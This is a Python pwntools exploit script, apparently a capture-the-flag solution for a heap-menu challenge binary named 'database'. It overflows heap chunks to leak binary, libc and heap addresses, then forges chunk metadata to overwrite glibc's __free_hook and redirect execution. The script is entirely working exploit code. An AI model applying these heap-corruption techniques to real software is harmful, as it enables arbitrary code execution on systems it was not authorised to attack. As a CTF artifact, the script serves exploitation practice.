#!/usr/bin/python3

from pwn import *

exe = ELF("./database_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+109
        c
        ''')
        input()

def view():
    sna(b'choice => ', 1)

def add(size, data):
    sna(b'choice => ', 2)
    sna(b'length of string => ', size)
    sa(b'string you want to save => ', data)
    
def edit(index, size, data):
    sna(b'choice => ', 3)
    sna(b'index of element => ', index)
    sna(b'length of string => ', size)
    sa(b'enter the string => ', data)

def dell(index):
    sna(b'choice => ', 4)
    sna(b'index of element => ', index)
    
if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
p.recvuntil(b'help: ')
binary_leak = int(p.recvline()[:-1], 16)
log.info(f"binary_leak = {hex(binary_leak)}")
binary_base = binary_leak - 0x1275
log.info(f"binary_base = {hex(binary_base)}")

add(0x40, b'SUPPORT') # 0
add(0x40, b'A') # 1
add(0x40, b'B') # 2
add(0x430, b'C') # 3
add(0x40, b'D') # 4
dell(3)
edit(2, 0x100, b'B'*72 + p64(0x441))
view()
p.recvuntil(b'B' * 72)
p.recv(8)
libc_leak = u64(p.recv(8))
log.info(f"libc_leak = {hex(libc_leak)}")
libc.address = libc_leak - 0x3ebc00
log.info(f"libc_base = {hex(libc.address)}")

dell(2)
edit(1, 0x100, b'A' * 72 + p64(0x51))
view()
p.recvuntil(b'A' * 72)
p.recv(16)
heap_leak = u64(p.recv(8))
log.info(f"heap_leak = {hex(heap_leak)}")
heap_base = heap_leak - 0x10
log.info(f"heap_base = {hex(heap_base)}")

add(0x40, b'B')
add(0x430, b'C')

edit(0, 0x100, b'S'*72 + p64(0x51) + p64(0) + p64(0x90) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0) + p64(0) + p64(0))
edit(2, 0x100, b'B' * 64 + p64(0x90) + p64(0x440))
dell(3)
dell(0)
dell(2)
add(0x4c1, b'A' * 56 + p64(0x51) + p64(libc.sym.__free_hook))
add(0x40, b'a')
add(0x40, p64(binary_base + 0x1262))
dell(0)

p.interactive()

